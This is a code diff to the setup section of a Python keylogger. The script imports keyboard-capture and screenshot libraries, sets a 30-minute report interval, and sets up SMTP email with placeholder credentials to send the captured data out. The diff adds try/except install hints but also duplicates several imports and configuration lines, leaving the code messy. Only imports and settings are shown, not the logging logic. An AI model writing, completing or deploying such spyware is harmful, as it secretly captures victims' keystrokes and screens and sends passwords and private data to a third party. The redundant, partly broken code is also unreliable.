@@ -1,15 +1,34 @@
-import keyboard  # for keylogs
 import socket
 import os
 import platform
 import smtplib  # for sending email using SMTP protocol (gmail)
-from email.mime.text import MIMEText #for attaching images in the mail
+from email.mime.text import MIMEText  # for attaching images in the mail
 from email.mime.image import MIMEImage
 from email.mime.multipart import MIMEMultipart
-# Semaphore is for blocking the current thread # Timer is to make a method runs after an `interval` amount of time
 from threading import Semaphore, Timer
-import pyscreenshot as ImageGrab #for screenshot
+from email.mime.image import MIMEImage
+from email.mime.multipart import MIMEMultipart
+import smtplib  # for sending email using SMTP protocol (gmail)
+from email.mime.text import MIMEText  # for attaching images in the mail
 
+try:
+    import keyboard  # for keylogs
+except ImportError:
+    print("Please install the 'keyboard' module. You can install it by running 'pip install keyboard' in your terminal.")
+    exit(1)
+
+try:
+    import pyscreenshot as ImageGrab  # for screenshot
+except ImportError:
+    print("Please install the 'pyscreenshot' module. You can install it by running 'pip install pyscreenshot' in your terminal.")
+    exit(1)
+
+SEND_REPORT_EVERY = 1800  # 30 minutes
+
+EMAIL_ADDRESS = " "  # Enter Email
+EMAIL_PASSWORD = " "  # Enter Password
+EMAIL_ADDRESS = " "  # Enter Email
+EMAIL_PASSWORD = " "  # Enter Password
 SEND_REPORT_EVERY = 1800  # 30 minutes
 EMAIL_ADDRESS = " " #Enter Email
 EMAIL_PASSWORD = " " # Enter Password
